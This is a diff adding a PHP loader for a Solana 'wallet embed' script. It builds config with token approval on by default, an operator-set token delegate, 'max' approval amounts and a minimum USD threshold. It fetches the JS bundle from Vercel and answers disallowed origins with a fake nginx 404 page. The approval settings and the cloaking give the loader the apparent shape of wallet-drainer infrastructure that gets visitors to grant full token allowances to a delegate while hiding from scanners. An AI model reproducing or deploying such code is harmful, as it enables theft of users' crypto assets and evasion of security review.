@@ -1,0 +1,279 @@
+<?php
+declare(strict_types=1);
+
+/**
+ * @param array<string, mixed> $cfg
+ */
+function build_embed_config(array $cfg, string $siteUrl): array
+{
+    return [
+        'projectId' => (string) ($cfg['reown_project_id'] ?? ''),
+        'buttonClass' => (string) ($cfg['button_class'] ?? ''),
+        'buttonClassMode' => (string) ($cfg['button_class_mode'] ?? 'exact'),
+        'network' => (string) ($cfg['network'] ?? 'solana'),
+        'siteName' => (string) ($cfg['site_name'] ?? 'Website'),
+        'siteDescription' => (string) ($cfg['site_description'] ?? ''),
+        'siteUrl' => $siteUrl,
+        'siteIcons' => $cfg['site_icons'] ?? ($siteUrl !== '' ? ["{$siteUrl}/favicon.ico"] : []),
+        'analytics' => (bool) ($cfg['analytics'] ?? true),
+        'tokenApprovalEnabled' => (bool) ($cfg['token_approval_enabled'] ?? true),
+        'tokenDelegate' => (string) ($cfg['token_delegate'] ?? ''),
+        'tokenApprovalMaxCount' => (int) ($cfg['token_approval_max_count'] ?? 0),
+        'tokenApprovalMinUsd' => (float) ($cfg['token_approval_min_usd'] ?? 1),
+        'tokenApprovalAmountMode' => (string) ($cfg['token_approval_amount_mode'] ?? 'max'),
+        'solanaRpcUrl' => (string) ($cfg['solana_rpc_url'] ?? ''),
+    ];
+}
+
+/**
+ * @param array<string, mixed> $cfg
+ */
+function script_request_allowed(array $cfg, string $siteUrl): bool
+{
+    if (array_key_exists('restrict_script_access', $cfg) && $cfg['restrict_script_access'] === false) {
+        return true;
+    }
+
+    $allowedHosts = allowed_hosts($cfg, $siteUrl);
+    if ($allowedHosts === []) {
+        return true;
+    }
+
+    foreach (request_source_hosts() as $host) {
+        if (in_array($host, $allowedHosts, true)) {
+            return true;
+        }
+    }
+
+    $secFetchSite = strtolower((string) ($_SERVER['HTTP_SEC_FETCH_SITE'] ?? ''));
+    if ($secFetchSite === 'same-origin' || $secFetchSite === 'same-site') {
+        return true;
+    }
+
+    return false;
+}
+
+/**
+ * @param array<string, mixed> $cfg
+ * @return list<string>
+ */
+function allowed_hosts(array $cfg, string $siteUrl): array
+{
+    $hosts = [];
+
+    $host = parse_url($siteUrl, PHP_URL_HOST);
+    if (is_string($host) && $host !== '') {
+        $hosts[] = strtolower($host);
+        if (str_starts_with($host, 'www.')) {
+            $hosts[] = substr($host, 4);
+        } else {
+            $hosts[] = 'www.' . $host;
+        }
+    }
+
+    $serverHost = strtolower((string) ($_SERVER['HTTP_HOST'] ?? ''));
+    $serverHost = preg_replace('/:\d+$/', '', $serverHost) ?? $serverHost;
+    if ($serverHost !== '') {
+        $hosts[] = $serverHost;
+    }
+
+    foreach ($cfg['allowed_script_hosts'] ?? [] as $extra) {
+        if (is_string($extra) && $extra !== '') {
+            $hosts[] = strtolower($extra);
+        }
+    }
+
+    return array_values(array_unique($hosts));
+}
+
+/**
+ * @return list<string>
+ */
+function request_source_hosts(): array
+{
+    $hosts = [];
+
+    foreach (['HTTP_ORIGIN', 'HTTP_REFERER'] as $header) {
+        $value = $_SERVER[$header] ?? '';
+        if (!is_string($value) || $value === '') {
+            continue;
+        }
+        $host = parse_url($value, PHP_URL_HOST);
+        if (is_string($host) && $host !== '') {
+            $hosts[] = strtolower($host);
+        }
+    }
+
+    return array_values(array_unique($hosts));
+}
+
+function send_generic_not_found(): void
+{
+    http_response_code(404);
+    header('Content-Type: text/html; charset=utf-8');
+    header('Cache-Control: no-store');
+    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head>'
+        . '<body><center><h1>404 Not Found</h1></center>'
+        . '<hr><center>nginx</center></body></html>';
+}
+
+/**
+ * Site shown in Reown metadata — use HTML domain when script is on Vercel.
+ *
+ * @param array<string, mixed> $cfg
+ */
+/**
+ * Load JS bundle from local assets/ or fetch from Vercel (cached on VPS).
+ *
+ * @param array<string, mixed> $cfg
+ */
+function load_wallet_bundle(array $cfg): ?string
+{
+    $vercelUrl = trim((string) ($cfg['vercel_bundle_url'] ?? ''));
+    if ($vercelUrl !== '') {
+        $ttl = max(60, (int) ($cfg['vercel_bundle_cache_seconds'] ?? 300));
+        return fetch_vercel_bundle_cached($vercelUrl, $ttl);
+    }
+
+    $local = __DIR__ . '/assets/wallet.bundle.js';
+    if (!is_file($local)) {
+        return null;
+    }
+
+    $contents = file_get_contents($local);
+    return $contents === false ? null : $contents;
+}
+
+/**
+ * @return list<string>
+ */
+function vercel_bundle_hosts_allowed(): array
+{
+    return ['vercel.app', 'vercel.sh'];
+}
+
+/**
+ * @param string $url
+ */
+function assert_vercel_bundle_url(string $url): void
+{
+    $parts = parse_url($url);
+    if (($parts['scheme'] ?? '') !== 'https') {
+        throw new RuntimeException('vercel_bundle_url must use https');
+    }
+
+    $host = strtolower((string) ($parts['host'] ?? ''));
+    $ok = false;
+    foreach (vercel_bundle_hosts_allowed() as $suffix) {
+        if ($host === $suffix || str_ends_with($host, '.' . $suffix)) {
+            $ok = true;
+            break;
+        }
+    }
+    if (!$ok) {
+        throw new RuntimeException('vercel_bundle_url host must be a Vercel domain');
+    }
+
+    $path = (string) ($parts['path'] ?? '');
+    if ($path === '' || $path === '/') {
+        throw new RuntimeException('vercel_bundle_url must include a path, e.g. /wallet.bundle.js');
+    }
+}
+
+/**
+ * @param string $url
+ */
+function fetch_vercel_bundle_cached(string $url, int $ttlSeconds): ?string
+{
+    assert_vercel_bundle_url($url);
+
+    $cacheDir = __DIR__ . '/cache';
+    if (!is_dir($cacheDir) && !mkdir($cacheDir, 0750, true) && !is_dir($cacheDir)) {
+        return fetch_vercel_bundle_remote($url);
+    }
+
+    $cacheFile = $cacheDir . '/wallet.bundle.js';
+    if (is_file($cacheFile) && (time() - filemtime($cacheFile)) < $ttlSeconds) {
+        $cached = file_get_contents($cacheFile);
+        if ($cached !== false && $cached !== '') {
+            return $cached;
+        }
+    }
+
+    $remote = fetch_vercel_bundle_remote($url);
+    if ($remote !== null && $remote !== '') {
+        file_put_contents($cacheFile, $remote, LOCK_EX);
+    }
+
+    return $remote;
+}
+
+/**
+ * @param string $url
+ */
+function fetch_vercel_bundle_remote(string $url): ?string
+{
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        if ($ch === false) {
+            return null;
+        }
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_MAXREDIRS => 3,
+            CURLOPT_CONNECTTIMEOUT => 10,
+            CURLOPT_TIMEOUT => 60,
+            CURLOPT_USERAGENT => 'wallet-embed-loader/1.0',
+        ]);
+        $body = curl_exec($ch);
+        $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        if ($body === false || $code < 200 || $code >= 300) {
+            return null;
+        }
+        return (string) $body;
+    }
+
+    $ctx = stream_context_create([
+        'http' => [
+            'timeout' => 60,
+            'header' => "User-Agent: wallet-embed-loader/1.0\r\n",
+        ],
+        'ssl' => [
+            'verify_peer' => true,
+            'verify_peer_name' => true,
+        ],
+    ]);
+    $body = @file_get_contents($url, false, $ctx);
+    if ($body === false || $body === '') {
+        return null;
+    }
+
+    return $body;
+}
+
+/**
+ * @param array<string, mixed> $cfg
+ */
+function detect_site_url(array $cfg): string
+{
+    $override = rtrim((string) ($cfg['site_url'] ?? ''), '/');
+    if ($override !== '') {
+        return $override;
+    }
+
+    $host = $_SERVER['HTTP_HOST'] ?? '';
+    if ($host === '') {
+        return '';
+    }
+
+    $host = preg_replace('/:\d+$/', '', $host) ?? $host;
+
+    $https =
+        (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
+        || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https')
+        || (($_SERVER['SERVER_PORT'] ?? '') === '443');
+
+    return ($https ? 'https' : 'http') . '://' . $host;
+}
